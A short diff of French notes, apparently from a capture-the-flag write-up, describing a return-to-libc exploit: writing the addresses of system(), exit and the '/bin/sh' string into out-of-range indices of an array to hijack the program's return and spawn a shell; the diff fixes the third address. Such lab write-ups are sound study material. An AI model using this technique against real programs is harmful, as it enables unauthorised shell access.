@@ -17,6 +17,6 @@ Idee generale : enregistrer un number a un index plus loin que 100 et reecrire a
 
     1) 4159090384 (system = 0xf7e6aed0) a l'index 1073741938 (114)
     2) 4159040368 (exit = 0xf7e5eb70) a l'index 115
-    3) 4160264172 (system = 0xf7e6aed0) a l'index 116
+    3) 4160264172 (/bin/sh = 0xf7f897ec) a l'index 116
 
     4) on lance quit => pour appeler system() stocke dans l'eip du main
